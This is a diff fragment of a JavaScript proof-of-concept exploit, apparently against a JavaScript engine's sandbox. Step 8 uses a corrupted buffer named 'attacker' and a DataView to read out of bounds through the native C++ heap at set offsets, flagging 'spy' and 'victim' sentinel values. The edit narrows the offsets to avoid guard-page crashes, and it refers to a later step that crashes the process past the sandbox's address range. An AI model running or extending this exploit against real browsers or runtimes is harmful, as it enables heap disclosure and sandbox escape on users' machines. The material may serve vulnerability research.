@@ -217,15 +217,15 @@ banner('STEP 8 — OOB crash demonstration');
 print('  byteLength=' + attacker.byteLength + ' (' + (attacker.byteLength/(1<<30)).toFixed(1) + ' GB)');
 print('  Reading through native C++ heap at increasing offsets via corrupted EPT...\n');
 const oob = new DataView(attacker);
-const PROOF_OFFSETS = [0, 0x40, 0x100, 0x1000, 0x2000, 0x4000, 0x8000, 0x10000,
-                       0x40000, 0x100000, 0x1000000];
+// Stop at 0x4000 — 0x8000+ hits malloc guard pages (SIGBUS). Step 9 does the crash.
+const PROOF_OFFSETS = [0, 0x40, 0x100, 0x1000, 0x2000, 0x4000];
 for (let off of PROOF_OFFSETS) {
   if (off >= attacker.byteLength) { print('  offset >= byteLength, done'); break; }
   let v = oob.getUint32(off, true);
   let note = (v===SIG0)?'  ← spy sentinel':(v===0xCAFEBABE?'  ← victim':'');
   print('  spy_ptr+' + hex(off) + ': ' + hex(v) + note);
 }
-print('\n  [SIGBUS/SIGSEGV at spy_ptr+N = reading native C++ heap via corrupted EPT]');
+print('\n  [0x8000+ would SIGBUS (malloc guard pages). Step 9 triggers SIGSEGV past sandbox VA end]');
 
 // ── Summary ───────────────────────────────────────────────────────────
 banner('RESULT SUMMARY');
